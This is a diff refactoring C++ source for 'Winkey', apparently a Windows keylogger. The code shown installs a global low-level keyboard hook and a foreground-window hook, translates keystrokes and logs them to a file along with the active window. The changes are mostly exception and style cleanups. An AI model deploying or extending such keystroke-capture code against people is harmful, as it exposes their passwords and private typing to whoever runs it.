@@ -13,24 +13,12 @@ HWND            Winkey::_currentWindow;
 
 Winkey::Winkey()
 {
-    // Prevent multiple instances of this program
-    _singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
-    if (GetLastError() == ERROR_ALREADY_EXISTS)
-        throw InstanceAlreadyRunnningException();
-
     // Set window and keyboard hooks
-    try
-    {
-        setHooks();
-    }
-    catch (HookSettingFailureException &e)
-    {
-        throw std::runtime_error(e.what());
-    }
+    setHooks();
 }
 
 // Set hooks to intercept events
-void Winkey::setHooks()
+void Winkey::setHooks(void)
 {
     // Set the event hook for foreground window changes (out-of-context)
     _winEventHook = SetWinEventHook(
@@ -40,12 +28,16 @@ void Winkey::setHooks()
         0, 0,
         WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
     if (!_winEventHook)
-        throw HookSettingFailureException();
+        throw WinkeyException(
+            WinkeyError::winEventHookFailure, "SetWinEventHook failed."
+        );
 
     // Install global low-level keyboard hook to intercept keystrokes
     _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
     if (!_keyboardHook)
-        throw HookSettingFailureException();
+        throw WinkeyException(
+            WinkeyError::keyboardHookFailure, "SetWindowsHookEx failed."
+        );
 }
 
 // Run the main loop of the program
@@ -61,7 +53,9 @@ void Winkey::run(bool testMode)
 
 
     if (!_logFile.is_open())
-        throw FileOpenFailureException();
+        throw WinkeyException(
+            WinkeyError::FileOpenFailure, "Failed to open or to create the log file."
+        );
 
     // Tell std::wofstream to use UTF-8 encoding when writing wide
     //  characters (wchar_t) to the file.
@@ -74,13 +68,11 @@ void Winkey::run(bool testMode)
      */
 
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0))
-    {
-    }
+    while (GetMessage(&msg, NULL, 0, 0)) {}
 }
 
 // Log the keystroke data to the log file
-void Winkey::logToFile()
+void Winkey::logToFile(void)
 {
     static HWND lastWindow = nullptr;
 
@@ -246,8 +238,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
 
         // If AltGr (RightAlt) is down, remove the LeftCtrl bit so ToUnicodeEx
         // treats it as a layout AltGr combo instead of Ctrl+Alt.
-        if ((keyboardState[VK_RMENU] & 0x80) && (keyboardState[VK_LCONTROL] & 0x80))
-        {
+        if ((keyboardState[VK_RMENU] & 0x80) && (keyboardState[VK_LCONTROL] & 0x80)) {
             keyboardState[VK_LCONTROL] &= ~0x80;
             keyboardState[VK_CONTROL] &= ~0x80;
         }
@@ -280,8 +271,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          *  the virtual key code.
          */
 
-        if (result > 0 && isPrintable(buffer[0]))
-        {
+        if (result > 0 && isPrintable(buffer[0])) {
             buffer[result] = L'\0';
             _keyStroke = buffer;
         }
